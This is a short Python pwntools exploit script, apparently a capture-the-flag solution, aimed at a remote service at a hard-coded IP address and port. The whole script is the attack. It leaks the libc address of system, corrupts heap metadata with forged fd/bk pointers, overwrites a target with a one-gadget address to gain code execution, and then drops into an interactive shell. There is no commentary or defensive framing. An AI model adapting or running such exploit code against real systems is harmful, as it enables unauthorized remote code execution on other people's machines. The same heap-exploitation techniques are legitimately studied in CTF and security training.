from pwn import *
import time

local = False

if local:
	HOST, PORT = '0.0.0.0', 31338
	gadget = 0xf0567
	system_offset = 0x45390
else:
	HOST, PORT = '52.199.49.117', 10006
	gadget = 0xf0567
	system_offset = 0x45390
r = remote(HOST, PORT)

r.sendline('1')
r.recvuntil('system : ')
system = int(r.recvline(), 16)
print hex(system)
for i in range(3):
	r.sendline('1')
	r.recvuntil('class : ')
	r.send('A' * 8)
r.sendline('3')
r.sendline('1')
r.recvuntil('class : ')

fd = 0x602058 - 0x10
bk = 0x6020a0
payload = 'A' * 8 + p64(0x21) + p64(fd) + p64(bk)

r.send(payload)
time.sleep(0.5)
target = system - system_offset + gadget
r.sendline('2')
r.sendline('3')
r.sendline('1')
r.recvuntil('class : ')
r.sendline(p64(target))
r.interactive()